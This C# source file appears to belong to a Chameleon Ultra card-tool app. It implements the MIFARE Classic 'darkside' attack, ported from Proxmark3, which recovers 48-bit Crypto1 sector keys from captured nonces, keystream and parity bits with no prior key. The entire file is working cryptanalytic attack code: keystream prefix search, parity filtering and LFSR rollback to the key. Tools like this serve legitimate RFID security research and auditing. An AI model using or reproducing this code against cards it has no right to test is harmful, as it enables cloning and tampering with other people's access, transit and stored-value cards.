using System.Collections.Generic;
using ChameLab.Models;
using Crapto1Sharp;

namespace ChameLab.Services;

/// <summary>
/// MIFARE Classic "darkside" key recovery, ported from the pm3 reference
/// (<c>crapto1.c</c> common-prefix attack + <c>mfkey.c</c> <c>nonce2key</c>, as wrapped by
/// ChameleonUltraGUI's <c>recovery.c</c>). It needs no known key: the firmware coaxes NACKs
/// out of the card by varying the low reader-nonce bits (device <c>Mf1DarksideAcquire</c>),
/// and this turns the captured keystream/parity into candidate keys.
///
/// With non-zero parity one round is usually enough; the parity-zero variant needs several
/// rounds and keeps only the keys common to all of them.
/// </summary>
public static class DarksideRecovery
{
    // pm3 fast-forward constants for the odd (index 1) and even (index 0) LFSR halves.
    private static readonly uint[][] FastFwd =
    [
        [0, 0x4BC53, 0xECB1, 0x450E2, 0x25E29, 0x6E27A, 0x2B298, 0x60ECB],
        [0, 0x1D962, 0x4BC53, 0x56531, 0xECB1, 0x135D3, 0x450E2, 0x58980],
    ];

    /// <summary>
    /// Recovers candidate 48-bit keys from one or more darkside rounds. Returns an empty list
    /// when nothing validated (collect more rounds, especially for the parity-zero case).
    /// </summary>
    public static IReadOnlyList<ulong> Recover(uint uid, IReadOnlyList<DarksideItem> items)
    {
        List<ulong>? last = null;

        foreach (var item in items)
        {
            var keys = Nonce2Key(uid, item.Nt, item.Nr, item.Ar, item.Par, item.Ks1);
            if (keys.Count == 0) continue;

            if (item.Par == 0)
            {
                // Parity-zero attack: a single round yields a huge set; the real key is the
                // one shared by consecutive rounds.
                if (last is null) { last = keys; continue; }
                var inter = Intersect(last, keys);
                if (inter.Count == 0) { last = keys; continue; }
                return inter;
            }

            return keys;
        }

        return System.Array.Empty<ulong>();
    }

    /// <summary>pm3 <c>nonce2key</c>: unpack the keystream/parity, run the common-prefix attack, roll each state back to its key.</summary>
    private static List<ulong> Nonce2Key(uint uid, uint nt, uint nr, uint ar, ulong parInfo, ulong ksInfo)
    {
        // The low three bits of nr are the ones the attack sweeps; clear them.
        nr &= 0xFFFFFF1F;

        var ks3x = new byte[8];
        var par = new byte[8][];
        for (var pos = 0; pos < 8; pos++)
        {
            ks3x[7 - pos] = (byte)((ksInfo >> (pos * 8)) & 0x0F);
            var bt = (byte)((parInfo >> (pos * 8)) & 0xFF);
            var row = new byte[8];
            for (var b = 0; b < 8; b++) row[b] = (byte)((bt >> b) & 1);
            par[7 - pos] = row;
        }

        var states = LfsrCommonPrefix(nr, ar, ks3x, par, parInfo == 0);

        var keys = new List<ulong>(states.Count);
        foreach (var found in states)
        {
            var state = found;
            state.LfsrRollbackWord(uid ^ nt, false);
            keys.Add(state.Lfsr);
        }
        return keys;
    }

    /// <summary>pm3 <c>lfsr_common_prefix</c>: combine the odd/even 21-bit prefix candidates and keep the states that survive the parity check.</summary>
    private static List<Crypto1State> LfsrCommonPrefix(uint pfx, uint rr, byte[] ks, byte[][] par, bool noPar)
    {
        var odd = LfsrPrefixKs(ks, 1);
        var even = LfsrPrefixKs(ks, 0);
        var result = new List<Crypto1State>();

        foreach (var oCand in odd)
        {
            // `o` accumulates across the whole even sweep, exactly as the pm3 pointer does.
            var o = oCand;
            foreach (var eCand in even)
            {
                var e = eCand;
                for (var top = 0; top < 64; top++)
                {
                    o += 1u << 21;
                    e += (uint)(((top & 7) == 0 ? 1 : 0) + 1) << 21;
                    if (CheckPfxParity(pfx, rr, par, o, e, noPar) is { } state)
                        result.Add(state);
                }
            }
        }

        return result;
    }

    /// <summary>pm3 <c>lfsr_prefix_ks</c>: the 21-bit partial states whose filtered output matches the observed keystream.</summary>
    private static List<uint> LfsrPrefixKs(byte[] ks, int isOdd)
    {
        var candidates = new List<uint>();
        for (uint i = 0; i < 1u << 21; i++)
        {
            var good = true;
            for (var c = 0; good && c < 8; c++)
            {
                var entry = i ^ FastFwd[isOdd][c];
                good &= ((ks[c] >> isOdd) & 1) == Crypto1.Filter(entry >> 1);
                good &= ((ks[c] >> (isOdd + 2)) & 1) == Crypto1.Filter(entry);
            }
            if (good) candidates.Add(i);
        }
        return candidates;
    }

    /// <summary>pm3 <c>check_pfx_parity</c>: eliminate candidate states using the reader-response parity bits; returns the surviving state or null.</summary>
    private static Crypto1State? CheckPfxParity(uint prefix, uint rResp, byte[][] par, uint odd, uint even, bool noPar)
    {
        var good = 1u;
        var sl = new Crypto1State(0, 0);

        for (var c = 0u; good != 0 && c < 8; c++)
        {
            sl.Odd = odd ^ FastFwd[1][c];
            sl.Even = even ^ FastFwd[0][c];

            sl.LfsrRollbackBit(0, false);
            sl.LfsrRollbackBit(0, false);

            int ks3 = sl.LfsrRollbackBit(0, false);
            var ks2 = sl.LfsrRollbackWord(0, false);
            var ks1 = sl.LfsrRollbackWord(prefix | (c << 5), true);

            if (noPar) break;

            var nr = ks1 ^ (prefix | (c << 5));
            var rr = ks2 ^ rResp;

            good &= (uint)((int)Crypto1.EvenParity32(nr & 0x000000ff) ^ par[c][3] ^ (int)((ks2 >> 24) & 1)) & 1;
            good &= (uint)((int)Crypto1.EvenParity32(rr & 0xff000000) ^ par[c][4] ^ (int)((ks2 >> 16) & 1)) & 1;
            good &= (uint)((int)Crypto1.EvenParity32(rr & 0x00ff0000) ^ par[c][5] ^ (int)((ks2 >> 8) & 1)) & 1;
            good &= (uint)((int)Crypto1.EvenParity32(rr & 0x0000ff00) ^ par[c][6] ^ (int)(ks2 & 1)) & 1;
            good &= (uint)((int)Crypto1.EvenParity32(rr & 0x000000ff) ^ par[c][7] ^ ks3) & 1;
        }

        return good != 0 ? sl : null;
    }

    private static List<ulong> Intersect(List<ulong> a, List<ulong> b)
    {
        var set = new HashSet<ulong>(a);
        var outp = new List<ulong>();
        var seen = new HashSet<ulong>();
        foreach (var k in b)
            if (set.Contains(k) && seen.Add(k)) outp.Add(k);
        return outp;
    }
}
